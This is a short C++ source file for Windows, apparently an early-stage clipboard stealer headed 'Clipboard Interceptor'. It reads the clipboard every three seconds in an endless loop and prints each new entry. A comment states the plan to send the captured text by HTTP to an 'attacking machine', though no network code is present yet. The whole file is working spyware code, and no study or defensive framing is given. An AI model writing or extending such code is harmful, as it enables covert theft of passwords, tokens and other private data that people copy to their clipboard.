#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

// Console ouput UTF_16 format, TODO REMOVE
#include <fcntl.h>
#include <io.h>

// Extracting in UTF_16 format, Windows console could not show it properly
// TODO test if final result after HTTP call to attacking machine is correctly formatted for all symbols
std::wstring GetClipboardText()
{
    if(!OpenClipboard(nullptr))
    {
        return L"Failed. Clipboard is not open.";
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);

    wchar_t* textArray = static_cast<wchar_t*>(GlobalLock(hData));
    if(textArray == nullptr)
    {
        CloseClipboard();
        return L"Failed. Cannot lock clipboard memory location.";
    }

    std::wstring text(textArray);

    GlobalUnlock(hData);
    CloseClipboard();

    return text;
}


int main() {
    // Console ouput UTF_16 format, TODO REMOVE
    _setmode(_fileno(stdout), _O_U16TEXT);

    std::wcout << L"[*] Clipboard Interceptor Started\n";
    std::wstring lastClipboard = L"";

    while(true)
    {
        std::wstring currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) {
            std::wcout << L"[*] New Clipboard Content:\n\n" << currentClipboard << L"\n\n";
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
